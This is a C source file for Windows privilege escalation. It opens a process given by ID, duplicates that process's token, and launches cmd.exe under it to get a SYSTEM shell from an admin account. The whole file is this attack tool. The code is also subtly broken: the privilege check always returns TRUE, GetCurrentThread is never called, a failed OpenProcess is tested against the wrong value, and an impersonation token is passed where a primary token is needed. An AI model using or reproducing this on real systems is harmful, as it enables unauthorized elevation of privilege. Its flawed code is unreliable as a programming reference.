#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h> 
/*Windows impersonation test
Launch a system cmd with system account
from admin user*/
BOOL CheckWindowsPrivilege(WCHAR* Privilege)
{
	/* Checks for Privilege and returns True or False. */
	LUID luid = { 0 };
	PRIVILEGE_SET privs;
	HANDLE hProcess;
	HANDLE hToken;
	hProcess = GetCurrentProcess();
	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
		printf("1");
		return FALSE;
	}
	if (!LookupPrivilegeValue(NULL, Privilege, &luid)) {
		printf("2");
		return FALSE;
	}
	privs.PrivilegeCount = 1;
	privs.Control = PRIVILEGE_SET_ALL_NECESSARY;
	privs.Privilege[0].Luid = luid;
	privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
	return TRUE;
}
int main(int argc, char* argv[]) {
	BOOL test = CheckWindowsPrivilege(SE_DEBUG_NAME);
	if (test == FALSE) {
		printf("Error SE_DEBUG_PRIV");
		return 1;
	}
	printf("SE_DEBUG_PRIV OK \n");
	
	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, atol(argv[1]));
	if (process == INVALID_HANDLE_VALUE) {
		printf("Error opening process handle");
		return 1;
	}
	printf("Process handle opened \n");
	HANDLE token; 
	HANDLE dup_token; 
	HANDLE myThread = GetCurrentThread;
	OpenProcessToken(process, TOKEN_DUPLICATE, &token);
	DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &dup_token);
	SetThreadToken(&myThread, dup_token);
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	BOOL ret;
	ret = CreateProcessWithTokenW(dup_token, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
	
	return 0;
	

}
